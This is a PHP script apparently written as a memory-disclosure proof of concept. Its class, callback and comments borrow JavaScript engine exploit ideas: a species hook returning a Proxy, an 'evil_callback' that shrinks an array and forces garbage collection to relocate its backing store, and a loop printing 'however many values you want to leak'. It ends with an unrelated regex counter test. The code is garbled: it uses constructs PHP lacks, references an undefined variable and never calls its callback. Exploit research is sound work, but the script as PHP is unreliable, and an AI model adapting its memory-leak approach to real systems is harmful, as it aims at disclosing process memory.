<?php
require "/home/w023dtc/template.inc";


class MyArray extends ArrayObject {
    public static function getSpecies() {
        return function() { return new Proxy(new ArrayObject(), new stdClass()); };
    }
}

$w = new MyArray(range(1, PHP_INT_MAX));
$w[1] = 0.1;
$w[2] = 0.1;

function gc() {
    for ($i = 0; $i < PHP_INT_MAX; $i++) {
        $a = new stdClass();
    }
}

function evil_callback() {
    $w->setInfo('size', 1); // shorten the array so the backstore pointer is relocated
    gc(); // force gc to move the array's elements backstore
    return new ReflectionProperty('stdClass', 'defineProperty');
}

spl_autoload_register(function($class) {
    if ($class =='stdClass') {
        return;
    }
    throw new Exception("Class not found: $class");
});

spl_autoload_register(function($class) {
    if ($class == 'ArrayObject') {
        return;
    }
    throw new Exception("Class not found: $class");
});

$c = array_merge(array_values($w->getArrayCopy()));

for ($i = 0; $i < 20; $i++) { // however many values you want to leak
    echo $c[$i]. "\n";
}

const r = '/x/';
$counter = 0;

class Regex {
    public static function exec() {
        global $counter;
        $counter++;
        return null;
    }
}

function f() {
    preg_match(r, 'ABcd');
}

f();
echo $counter. "\n";
f();
echo $counter. "\n";

?>
